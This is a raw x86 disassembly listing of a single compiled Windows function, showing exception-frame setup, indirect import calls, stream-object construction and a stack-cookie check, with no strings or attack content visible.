  401be3:	57                   	push   %edi
  401be4:	50                   	push   %eax
  401be5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401be8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401bee:	33 db                	xor    %ebx,%ebx
  401bf0:	8b f9                	mov    %ecx,%edi
  401bf2:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  401bf5:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  401bf8:	39 1d b8 11 41 00    	cmp    %ebx,0x4111b8
  401bfe:	74 12                	je     0x401c12
  401c00:	68 84 a4 40 00       	push   $0x40a484
  401c05:	e8 d6 fe ff ff       	call   0x401ae0
  401c0a:	83 c4 04             	add    $0x4,%esp
  401c0d:	e9 55 07 00 00       	jmp    0x402367
  401c12:	b8 01 00 00 00       	mov    $0x1,%eax
  401c17:	a3 b8 11 41 00       	mov    %eax,0x4111b8
  401c1c:	39 05 bc f5 40 00    	cmp    %eax,0x40f5bc
  401c22:	75 6e                	jne    0x401c92
  401c24:	39 1d bc 11 41 00    	cmp    %ebx,0x4111bc
  401c2a:	0f 85 a2 00 00 00    	jne    0x401cd2
  401c30:	6a 08                	push   $0x8
  401c32:	ff 15 ec a1 40 00    	call   *0x40a1ec
  401c38:	8b f0                	mov    %eax,%esi
  401c3a:	83 c4 04             	add    $0x4,%esp
  401c3d:	89 75 c8             	mov    %esi,-0x38(%ebp)
  401c40:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401c43:	3b f3                	cmp    %ebx,%esi
  401c45:	74 29                	je     0x401c70
  401c47:	8b cf                	mov    %edi,%ecx
  401c49:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  401c4c:	e8 cf 1b 00 00       	call   0x403820
  401c51:	b9 01 00 00 00       	mov    $0x1,%ecx
  401c56:	88 4d fc             	mov    %cl,-0x4(%ebp)
  401c59:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401c5c:	8b 0d c0 f5 40 00    	mov    0x40f5c0,%ecx
  401c62:	51                   	push   %ecx
  401c63:	50                   	push   %eax
  401c64:	8b ce                	mov    %esi,%ecx
  401c66:	ff 15 e4 a2 40 00    	call   *0x40a2e4
  401c6c:	33 db                	xor    %ebx,%ebx
  401c6e:	eb 02                	jmp    0x401c72
  401c70:	33 c0                	xor    %eax,%eax
  401c72:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401c79:	f6 45 cc 01          	testb  $0x1,-0x34(%ebp)
  401c7d:	a3 bc 11 41 00       	mov    %eax,0x4111bc
  401c82:	74 4e                	je     0x401cd2
  401c84:	83 65 cc fe          	andl   $0xfffffffe,-0x34(%ebp)
  401c88:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  401c8b:	e8 60 3c 00 00       	call   0x4058f0
  401c90:	eb 40                	jmp    0x401cd2
  401c92:	8d 5d d4             	lea    -0x2c(%ebp),%ebx
  401c95:	e8 86 1b 00 00       	call   0x403820
  401c9a:	8b f0                	mov    %eax,%esi
  401c9c:	6a 00                	push   $0x0
  401c9e:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  401ca5:	ff 15 ec a2 40 00    	call   *0x40a2ec
  401cab:	50                   	push   %eax
  401cac:	56                   	push   %esi
  401cad:	ff 15 e8 a2 40 00    	call   *0x40a2e8
  401cb3:	83 c4 0c             	add    $0xc,%esp
  401cb6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401cbd:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401cc1:	72 0d                	jb     0x401cd0
  401cc3:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401cc6:	52                   	push   %edx
  401cc7:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401ccd:	83 c4 04             	add    $0x4,%esp
  401cd0:	33 db                	xor    %ebx,%ebx
  401cd2:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
  401cd8:	50                   	push   %eax
  401cd9:	ff 15 f0 a2 40 00    	call   *0x40a2f0
  401cdf:	83 c4 04             	add    $0x4,%esp
  401ce2:	68 30 75 00 00       	push   $0x7530
  401ce7:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  401ced:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  401cf4:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  401cfa:	84 c0                	test   %al,%al
  401cfc:	74 60                	je     0x401d5e
  401cfe:	ff 15 f4 a2 40 00    	call   *0x40a2f4
  401d04:	8b f8                	mov    %eax,%edi
  401d06:	68 a0 a4 40 00       	push   $0x40a4a0
  401d0b:	57                   	push   %edi
  401d0c:	e8 2f 5f 00 00       	call   0x407c40
  401d11:	83 c4 08             	add    $0x8,%esp
  401d14:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  401d17:	8b c7                	mov    %edi,%eax
  401d19:	e8 42 43 00 00       	call   0x406060
  401d1e:	68 c8 a4 40 00       	push   $0x40a4c8
  401d23:	68 e6 17 00 00       	push   $0x17e6
  401d28:	68 00 a5 40 00       	push   $0x40a500
  401d2d:	50                   	push   %eax
  401d2e:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  401d34:	68 30 75 00 00       	push   $0x7530
  401d39:	51                   	push   %ecx
  401d3a:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  401d3e:	ff 15 f8 a2 40 00    	call   *0x40a2f8
  401d44:	83 c4 18             	add    $0x18,%esp
  401d47:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  401d4b:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401d4f:	72 0d                	jb     0x401d5e
  401d51:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401d54:	52                   	push   %edx
  401d55:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401d5b:	83 c4 04             	add    $0x4,%esp
  401d5e:	33 c0                	xor    %eax,%eax
  401d60:	66 89 45 d4          	mov    %ax,-0x2c(%ebp)
  401d64:	be 07 00 00 00       	mov    $0x7,%esi
  401d69:	6a 02                	push   $0x2
  401d6b:	b8 58 a5 40 00       	mov    $0x40a558,%eax
  401d70:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401d73:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401d76:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  401d79:	e8 92 55 00 00       	call   0x407310
  401d7e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401d81:	51                   	push   %ecx
  401d82:	8d 95 10 ff ff ff    	lea    -0xf0(%ebp),%edx
  401d88:	52                   	push   %edx
  401d89:	c6 45 fc 06          	movb   $0x6,-0x4(%ebp)
  401d8d:	ff 15 e0 a2 40 00    	call   *0x40a2e0
  401d93:	83 c4 08             	add    $0x8,%esp
  401d96:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  401d9a:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401d9e:	72 0d                	jb     0x401dad
  401da0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401da3:	50                   	push   %eax
  401da4:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401daa:	83 c4 04             	add    $0x4,%esp
  401dad:	33 c9                	xor    %ecx,%ecx
  401daf:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401db2:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  401db5:	66 89 4d d4          	mov    %cx,-0x2c(%ebp)
  401db9:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  401dbf:	75 3a                	jne    0x401dfb
  401dc1:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  401dc7:	52                   	push   %edx
  401dc8:	ff 15 14 a0 40 00    	call   *0x40a014
  401dce:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  401dd4:	74 08                	je     0x401dde
  401dd6:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  401ddb:	50                   	push   %eax
  401ddc:	eb 17                	jmp    0x401df5
  401dde:	6a 01                	push   $0x1
  401de0:	ff 15 ec a1 40 00    	call   *0x40a1ec
  401de6:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  401dec:	83 c4 04             	add    $0x4,%esp
  401def:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  401df4:	51                   	push   %ecx
  401df5:	ff 15 1c a0 40 00    	call   *0x40a01c
  401dfb:	8d 55 d3             	lea    -0x2d(%ebp),%edx
  401dfe:	52                   	push   %edx
  401dff:	c6 45 d3 01          	movb   $0x1,-0x2d(%ebp)
  401e03:	e8 78 26 00 00       	call   0x404480
  401e08:	83 c4 04             	add    $0x4,%esp
  401e0b:	bf 80 bb 00 00       	mov    $0xbb80,%edi
  401e10:	8d 45 d3             	lea    -0x2d(%ebp),%eax
  401e13:	57                   	push   %edi
  401e14:	50                   	push   %eax
  401e15:	88 5d d3             	mov    %bl,-0x2d(%ebp)
  401e18:	e8 63 26 00 00       	call   0x404480
  401e1d:	83 c4 04             	add    $0x4,%esp
  401e20:	8b c8                	mov    %eax,%ecx
  401e22:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  401e28:	84 c0                	test   %al,%al
  401e2a:	0f 84 7b 02 00 00    	je     0x4020ab
  401e30:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  401e36:	c7 85 20 ff ff ff b8 	movl   $0x40a3b8,-0xe0(%ebp)
  401e3d:	a3 40 00 
  401e40:	ff 15 dc a0 40 00    	call   *0x40a0dc
  401e46:	53                   	push   %ebx
  401e47:	53                   	push   %ebx
  401e48:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  401e4e:	51                   	push   %ecx
  401e4f:	c6 45 fc 09          	movb   $0x9,-0x4(%ebp)
  401e53:	83 4d cc 02          	orl    $0x2,-0x34(%ebp)
  401e57:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  401e5d:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  401e63:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  401e6a:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  401e70:	8b 42 04             	mov    0x4(%edx),%eax
  401e73:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  401e79:	c7 84 05 20 ff ff ff 	movl   $0x40a3b4,-0xe0(%ebp,%eax,1)
  401e80:	b4 a3 40 00 
  401e84:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401e87:	ff 15 1c a1 40 00    	call   *0x40a11c
  401e8d:	c6 45 fc 0b          	movb   $0xb,-0x4(%ebp)
  401e91:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  401e97:	c7 85 24 ff ff ff 74 	movl   $0x40a374,-0xdc(%ebp)
  401e9e:	a3 40 00 
  401ea1:	ff 15 04 a1 40 00    	call   *0x40a104
  401ea7:	c7 85 60 ff ff ff 20 	movl   $0x20,-0xa0(%ebp)
  401eae:	00 00 00 
  401eb1:	89 9d 64 ff ff ff    	mov    %ebx,-0x9c(%ebp)
  401eb7:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  401ebd:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
  401ec3:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
  401ec9:	c7 85 6c ff ff ff 04 	movl   $0x4,-0x94(%ebp)
  401ed0:	00 00 00 
  401ed3:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  401ed7:	8b 15 20 a1 40 00    	mov    0x40a120,%edx
  401edd:	52                   	push   %edx
  401ede:	51                   	push   %ecx
  401edf:	68 60 a5 40 00       	push   $0x40a560
  401ee4:	51                   	push   %ecx
  401ee5:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  401eeb:	68 68 a5 40 00       	push   $0x40a568
  401ef0:	50                   	push   %eax
  401ef1:	e8 aa f8 ff ff       	call   0x4017a0
  401ef6:	83 c4 0c             	add    $0xc,%esp
  401ef9:	50                   	push   %eax
  401efa:	e8 a1 f8 ff ff       	call   0x4017a0
  401eff:	83 c4 0c             	add    $0xc,%esp
  401f02:	8b c8                	mov    %eax,%ecx
  401f04:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  401f0a:	f6 85 6c ff ff ff 08 	testb  $0x8,-0x94(%ebp)
  401f11:	88 5d d3             	mov    %bl,-0x2d(%ebp)
  401f14:	89 7d c0             	mov    %edi,-0x40(%ebp)
  401f17:	c7 45 c8 f1 17 00 00 	movl   $0x17f1,-0x38(%ebp)
  401f1e:	75 3e                	jne    0x401f5e
  401f20:	83 8d 6c ff ff ff 08 	orl    $0x8,-0x94(%ebp)
  401f27:	8b 8d 58 ff ff ff    	mov    -0xa8(%ebp),%ecx
  401f2d:	8b 11                	mov    (%ecx),%edx
  401f2f:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  401f35:	03 10                	add    (%eax),%edx
  401f37:	8b 8d 34 ff ff ff    	mov    -0xcc(%ebp),%ecx
  401f3d:	89 95 64 ff ff ff    	mov    %edx,-0x9c(%ebp)
  401f43:	8b 09                	mov    (%ecx),%ecx
  401f45:	8b 00                	mov    (%eax),%eax
  401f47:	8b 95 38 ff ff ff    	mov    -0xc8(%ebp),%edx
  401f4d:	8b 12                	mov    (%edx),%edx
  401f4f:	51                   	push   %ecx
  401f50:	50                   	push   %eax
  401f51:	52                   	push   %edx
  401f52:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  401f58:	ff 15 0c a1 40 00    	call   *0x40a10c
  401f5e:	8b 85 44 ff ff ff    	mov    -0xbc(%ebp),%eax
  401f64:	8b 30                	mov    (%eax),%esi
  401f66:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  401f6c:	75 3a                	jne    0x401fa8
  401f6e:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  401f74:	51                   	push   %ecx
  401f75:	ff 15 14 a0 40 00    	call   *0x40a014
  401f7b:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  401f81:	74 09                	je     0x401f8c
  401f83:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  401f89:	52                   	push   %edx
  401f8a:	eb 16                	jmp    0x401fa2
  401f8c:	6a 01                	push   $0x1
  401f8e:	ff 15 ec a1 40 00    	call   *0x40a1ec
  401f94:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  401f99:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  401f9e:	83 c4 04             	add    $0x4,%esp
  401fa1:	50                   	push   %eax
  401fa2:	ff 15 1c a0 40 00    	call   *0x40a01c
  401fa8:	8d 4d d3             	lea    -0x2d(%ebp),%ecx
  401fab:	51                   	push   %ecx
  401fac:	e8 cf 24 00 00       	call   0x404480
  401fb1:	83 c4 04             	add    $0x4,%esp
  401fb4:	56                   	push   %esi
  401fb5:	8d 55 c0             	lea    -0x40(%ebp),%edx
  401fb8:	52                   	push   %edx
  401fb9:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401fbc:	51                   	push   %ecx
  401fbd:	68 00 a5 40 00       	push   $0x40a500
  401fc2:	8b c8                	mov    %eax,%ecx
  401fc4:	e8 d7 25 00 00       	call   0x4045a0
  401fc9:	f6 85 6c ff ff ff 08 	testb  $0x8,-0x94(%ebp)
  401fd0:	74 2c                	je     0x401ffe
  401fd2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  401fd8:	83 a5 6c ff ff ff f7 	andl   $0xfffffff7,-0x94(%ebp)
  401fdf:	8b 02                	mov    (%edx),%eax
  401fe1:	8b 95 64 ff ff ff    	mov    -0x9c(%ebp),%edx
  401fe7:	8b 8d 38 ff ff ff    	mov    -0xc8(%ebp),%ecx
  401fed:	8b 09                	mov    (%ecx),%ecx
  401fef:	52                   	push   %edx
  401ff0:	50                   	push   %eax
  401ff1:	51                   	push   %ecx
  401ff2:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  401ff8:	ff 15 0c a1 40 00    	call   *0x40a10c
  401ffe:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  402004:	8b 51 04             	mov    0x4(%ecx),%edx
  402007:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40200d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402010:	c7 84 15 20 ff ff ff 	movl   $0x40a3b4,-0xe0(%ebp,%edx,1)
  402017:	b4 a3 40 00 
  40201b:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402021:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402024:	c7 85 24 ff ff ff 74 	movl   $0x40a374,-0xdc(%ebp)
  40202b:	a3 40 00 
  40202e:	c6 45 fc 0e          	movb   $0xe,-0x4(%ebp)
  402032:	8b 8d 6c ff ff ff    	mov    -0x94(%ebp),%ecx
  402038:	80 e1 09             	and    $0x9,%cl
  40203b:	80 f9 01             	cmp    $0x1,%cl
  40203e:	75 29                	jne    0x402069
  402040:	8b 8d 74 ff ff ff    	mov    -0x8c(%ebp),%ecx
  402046:	3b cb                	cmp    %ebx,%ecx
  402048:	74 0d                	je     0x402057
  40204a:	8b 95 34 ff ff ff    	mov    -0xcc(%ebp),%edx
  402050:	8b 02                	mov    (%edx),%eax
  402052:	50                   	push   %eax
  402053:	ff d1                	call   *%ecx
  402055:	eb 0f                	jmp    0x402066
  402057:	8b 85 34 ff ff ff    	mov    -0xcc(%ebp),%eax
  40205d:	8b 00                	mov    (%eax),%eax
  40205f:	50                   	push   %eax
  402060:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  402066:	83 c4 04             	add    $0x4,%esp
  402069:	83 a5 6c ff ff ff f6 	andl   $0xfffffff6,-0x94(%ebp)
  402070:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  402076:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  40207c:	c6 45 fc 0d          	movb   $0xd,-0x4(%ebp)
  402080:	ff 15 18 a1 40 00    	call   *0x40a118
  402086:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  40208a:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  402090:	8b 51 04             	mov    0x4(%ecx),%edx
  402093:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  402098:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  40209e:	89 84 15 20 ff ff ff 	mov    %eax,-0xe0(%ebp,%edx,1)
  4020a5:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  4020ab:	8d 4d d3             	lea    -0x2d(%ebp),%ecx
  4020ae:	57                   	push   %edi
  4020af:	51                   	push   %ecx
  4020b0:	88 5d d3             	mov    %bl,-0x2d(%ebp)
  4020b3:	e8 c8 23 00 00       	call   0x404480
  4020b8:	83 c4 04             	add    $0x4,%esp
  4020bb:	8b c8                	mov    %eax,%ecx
  4020bd:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  4020c3:	84 c0                	test   %al,%al
  4020c5:	0f 84 7b 02 00 00    	je     0x402346
  4020cb:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  4020d1:	c7 85 20 ff ff ff b8 	movl   $0x40a3b8,-0xe0(%ebp)
  4020d8:	a3 40 00 
  4020db:	ff 15 dc a0 40 00    	call   *0x40a0dc
  4020e1:	53                   	push   %ebx
  4020e2:	53                   	push   %ebx
  4020e3:	8d 95 24 ff ff ff    	lea    -0xdc(%ebp),%edx
  4020e9:	c6 45 fc 0f          	movb   $0xf,-0x4(%ebp)
  4020ed:	be 04 00 00 00       	mov    $0x4,%esi
  4020f2:	09 75 cc             	or     %esi,-0x34(%ebp)
  4020f5:	52                   	push   %edx
  4020f6:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  4020fc:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  402102:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  402109:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  40210f:	8b 48 04             	mov    0x4(%eax),%ecx
  402112:	8d 95 24 ff ff ff    	lea    -0xdc(%ebp),%edx
  402118:	c7 84 0d 20 ff ff ff 	movl   $0x40a3b4,-0xe0(%ebp,%ecx,1)
  40211f:	b4 a3 40 00 
  402123:	8b ca                	mov    %edx,%ecx
  402125:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402128:	ff 15 1c a1 40 00    	call   *0x40a11c
  40212e:	c6 45 fc 11          	movb   $0x11,-0x4(%ebp)
  402132:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  402138:	c7 85 24 ff ff ff 74 	movl   $0x40a374,-0xdc(%ebp)
  40213f:	a3 40 00 
  402142:	ff 15 04 a1 40 00    	call   *0x40a104
  402148:	c7 85 60 ff ff ff 20 	movl   $0x20,-0xa0(%ebp)
  40214f:	00 00 00 
  402152:	89 9d 64 ff ff ff    	mov    %ebx,-0x9c(%ebp)
  402158:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  40215e:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
  402164:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
  40216a:	89 b5 6c ff ff ff    	mov    %esi,-0x94(%ebp)
  402170:	c6 45 fc 12          	movb   $0x12,-0x4(%ebp)
  402174:	a1 20 a1 40 00       	mov    0x40a120,%eax
  402179:	50                   	push   %eax
  40217a:	51                   	push   %ecx
  40217b:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40217e:	51                   	push   %ecx
  40217f:	51                   	push   %ecx
  402180:	8d 95 20 ff ff ff    	lea    -0xe0(%ebp),%edx
  402186:	68 88 a5 40 00       	push   $0x40a588
  40218b:	52                   	push   %edx
  40218c:	e8 0f f6 ff ff       	call   0x4017a0
  402191:	83 c4 0c             	add    $0xc,%esp
  402194:	50                   	push   %eax
  402195:	e8 06 f6 ff ff       	call   0x4017a0
  40219a:	83 c4 0c             	add    $0xc,%esp
  40219d:	8b c8                	mov    %eax,%ecx
  40219f:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  4021a5:	f6 85 6c ff ff ff 08 	testb  $0x8,-0x94(%ebp)
  4021ac:	88 5d d3             	mov    %bl,-0x2d(%ebp)
  4021af:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4021b2:	c7 45 c8 f2 17 00 00 	movl   $0x17f2,-0x38(%ebp)
  4021b9:	75 3e                	jne    0x4021f9
  4021bb:	83 8d 6c ff ff ff 08 	orl    $0x8,-0x94(%ebp)
  4021c2:	8b 85 58 ff ff ff    	mov    -0xa8(%ebp),%eax
  4021c8:	8b 08                	mov    (%eax),%ecx
  4021ca:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  4021d0:	03 08                	add    (%eax),%ecx
  4021d2:	8b 95 34 ff ff ff    	mov    -0xcc(%ebp),%edx
  4021d8:	89 8d 64 ff ff ff    	mov    %ecx,-0x9c(%ebp)
  4021de:	8b 0a                	mov    (%edx),%ecx
  4021e0:	8b 00                	mov    (%eax),%eax
  4021e2:	8b 95 38 ff ff ff    	mov    -0xc8(%ebp),%edx
  4021e8:	8b 12                	mov    (%edx),%edx
  4021ea:	51                   	push   %ecx
  4021eb:	50                   	push   %eax
  4021ec:	52                   	push   %edx
  4021ed:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  4021f3:	ff 15 0c a1 40 00    	call   *0x40a10c
  4021f9:	8b 85 44 ff ff ff    	mov    -0xbc(%ebp),%eax
  4021ff:	8b 30                	mov    (%eax),%esi
  402201:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  402207:	75 3a                	jne    0x402243
  402209:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  40220f:	51                   	push   %ecx
  402210:	ff 15 14 a0 40 00    	call   *0x40a014
  402216:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  40221c:	74 09                	je     0x402227
  40221e:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  402224:	52                   	push   %edx
  402225:	eb 16                	jmp    0x40223d
  402227:	6a 01                	push   $0x1
  402229:	ff 15 ec a1 40 00    	call   *0x40a1ec
  40222f:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  402234:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  402239:	83 c4 04             	add    $0x4,%esp
  40223c:	50                   	push   %eax
  40223d:	ff 15 1c a0 40 00    	call   *0x40a01c
  402243:	8d 4d d3             	lea    -0x2d(%ebp),%ecx
  402246:	51                   	push   %ecx
  402247:	e8 34 22 00 00       	call   0x404480
  40224c:	83 c4 04             	add    $0x4,%esp
  40224f:	56                   	push   %esi
  402250:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402253:	52                   	push   %edx
  402254:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402257:	51                   	push   %ecx
  402258:	68 00 a5 40 00       	push   $0x40a500
  40225d:	8b c8                	mov    %eax,%ecx
  40225f:	e8 3c 23 00 00       	call   0x4045a0
  402264:	f6 85 6c ff ff ff 08 	testb  $0x8,-0x94(%ebp)
  40226b:	74 2c                	je     0x402299
  40226d:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  402273:	83 a5 6c ff ff ff f7 	andl   $0xfffffff7,-0x94(%ebp)
  40227a:	8b 02                	mov    (%edx),%eax
  40227c:	8b 95 64 ff ff ff    	mov    -0x9c(%ebp),%edx
  402282:	8b 8d 38 ff ff ff    	mov    -0xc8(%ebp),%ecx
  402288:	8b 09                	mov    (%ecx),%ecx
  40228a:	52                   	push   %edx
  40228b:	50                   	push   %eax
  40228c:	51                   	push   %ecx
  40228d:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  402293:	ff 15 0c a1 40 00    	call   *0x40a10c
  402299:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  40229f:	8b 51 04             	mov    0x4(%ecx),%edx
  4022a2:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  4022a8:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4022ab:	c7 84 15 20 ff ff ff 	movl   $0x40a3b4,-0xe0(%ebp,%edx,1)
  4022b2:	b4 a3 40 00 
  4022b6:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  4022bc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4022bf:	c7 85 24 ff ff ff 74 	movl   $0x40a374,-0xdc(%ebp)
  4022c6:	a3 40 00 
  4022c9:	c6 45 fc 14          	movb   $0x14,-0x4(%ebp)
  4022cd:	8b 8d 6c ff ff ff    	mov    -0x94(%ebp),%ecx
  4022d3:	80 e1 09             	and    $0x9,%cl
  4022d6:	80 f9 01             	cmp    $0x1,%cl
  4022d9:	75 29                	jne    0x402304
  4022db:	8b 8d 74 ff ff ff    	mov    -0x8c(%ebp),%ecx
  4022e1:	3b cb                	cmp    %ebx,%ecx
  4022e3:	74 0d                	je     0x4022f2
  4022e5:	8b 95 34 ff ff ff    	mov    -0xcc(%ebp),%edx
  4022eb:	8b 02                	mov    (%edx),%eax
  4022ed:	50                   	push   %eax
  4022ee:	ff d1                	call   *%ecx
  4022f0:	eb 0f                	jmp    0x402301
  4022f2:	8b 85 34 ff ff ff    	mov    -0xcc(%ebp),%eax
  4022f8:	8b 00                	mov    (%eax),%eax
  4022fa:	50                   	push   %eax
  4022fb:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  402301:	83 c4 04             	add    $0x4,%esp
  402304:	83 a5 6c ff ff ff f6 	andl   $0xfffffff6,-0x94(%ebp)
  40230b:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  402311:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  402317:	c6 45 fc 13          	movb   $0x13,-0x4(%ebp)
  40231b:	ff 15 18 a1 40 00    	call   *0x40a118
  402321:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  402325:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  40232b:	8b 51 04             	mov    0x4(%ecx),%edx
  40232e:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  402333:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  402339:	89 84 15 20 ff ff ff 	mov    %eax,-0xe0(%ebp,%edx,1)
  402340:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  402346:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  40234a:	8b 35 d8 a2 40 00    	mov    0x40a2d8,%esi
  402350:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  402356:	ff d6                	call   *%esi
  402358:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  40235e:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402365:	ff d6                	call   *%esi
  402367:	33 c0                	xor    %eax,%eax
  402369:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40236c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402373:	59                   	pop    %ecx
  402374:	5f                   	pop    %edi
  402375:	5e                   	pop    %esi
  402376:	5b                   	pop    %ebx
  402377:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40237a:	33 cd                	xor    %ebp,%ecx
  40237c:	e8 ff 5d 00 00       	call   0x408180
  402381:	8b e5                	mov    %ebp,%esp
  402383:	5d                   	pop    %ebp
  402384:	c3                   	ret
  402385:	cc                   	int3
  402386:	cc                   	int3
  402387:	cc                   	int3
  402388:	cc                   	int3
  402389:	cc                   	int3
  40238a:	cc                   	int3
  40238b:	cc                   	int3
  40238c:	cc                   	int3
